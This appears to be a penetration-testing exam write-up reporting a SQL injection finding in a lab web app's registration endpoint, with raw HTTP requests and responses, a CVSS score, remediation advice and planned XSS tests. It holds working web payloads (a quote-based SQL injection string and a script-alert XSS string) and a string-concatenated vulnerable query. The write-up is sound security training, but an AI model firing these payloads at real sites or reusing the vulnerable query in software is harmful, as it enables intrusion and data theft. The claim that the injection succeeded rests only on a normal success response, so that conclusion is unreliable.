# FailSafe PWPA Exam - Phase 2: Registration Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/register

---

## Registration Functionality Testing

### Initial Registration Test
```http
POST /register HTTP/1.1
Host: 10.0.0.10
Content-Type: application/json

{"username":"testuser1","password":"Password123!"}
```
**Response:**
```json
{"message":"Registration successful!","success":true}
```

---

## SQL Injection Testing in Registration Username Field

### Vulnerability: SQL Injection (25 points)

**Description:**  
The registration endpoint accepts user input for the username field without proper sanitization or parameterized queries. An attacker can inject SQL code to manipulate the database query, potentially allowing unauthorized account creation or data extraction.

**Impact:**  
Attackers can bypass registration validation, create accounts with malicious usernames, or potentially extract sensitive data from the database. This could lead to account takeover, data leakage, or further exploitation of the application.

**Technical Details:**

**Vulnerable Endpoint:** POST /register
**Parameter:** username (in JSON body)
**Injection Point:** Username field accepts single quotes without escaping

**Test Payload:**
```json
{"username":"test' OR '1'='1","password":"Password123!"}
```

**Successful Injection:**
- **Request:**
```http
POST /register HTTP/1.1
Host: 10.0.0.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.0.0.10/
Content-Type: application/json
Content-Length: 56
Origin: 10.0.0.10
Connection: keep-alive
Cookie: connect.sid=s%3AmRTpjvwzeJI_gtGXEiRsEL4OZ8KDtLm9.kQXkg4WZ6hpBmYY81EcvqPPuA7IsKNgIuBotL22L%2FR4
Priority: u=0

{"username":"test' OR '1'='1","password":"Password123!"}
```

**Response:**
```http
HTTP/1.1 200 OK
Date: Sun, 18 Jan 2026 07:45:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: keep-alive
X-Powered-By: Express
ETag: W/"35-00pyRLWlSzoRujZbDfUAzBG83Eo"
Cache-Control: no-cache

{"message":"Registration successful!","success":true}
```

**CVSS v3.1 Score:** 8.6 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N  
**Rationale:** Network attack, low complexity, no privileges required, scope changed (affects database), high confidentiality impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple SQL injection payload
- **Required Access Level:** None
- **Technical Skill Required:** Low
- **Available Tools:** Publicly available

**Remediation:**
1. **Use parameterized queries** - Replace string concatenation with prepared statements
   ```javascript
   // Vulnerable code
   const query = "INSERT INTO users (username, password) VALUES ('" + username + "', '" + password + "')";

   // Secure code
   const query = "INSERT INTO users (username, password) VALUES (?, ?)";
   db.query(query, [username, password]);
   ```

2. **Input validation** - Sanitize and validate all user input
3. **Use ORM** - Implement an Object-Relational Mapping library
4. **Least privilege** - Database user should have minimal permissions
5. **Error handling** - Don't expose database errors to users

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (SQL Injection)

---

[Screenshots to be added here]
- Screenshot of Burp Repeater showing successful SQL injection
- Screenshot of registration with malicious payload
- Screenshot of database impact (if any)

---

## Additional Registration Tests

### Duplicate Username Test
- Tested registering same username twice
- Result: [To be tested]

### XSS in Registration Fields
- Payload: `<script>alert('XSS')</script>`
- Result: [To be tested]

### Password Policy Test
- Weak passwords allowed: Yes/No
- Result: [To be tested]

---

**Next Testing:** XSS in Registration Fields (Stored XSS - 25 points)
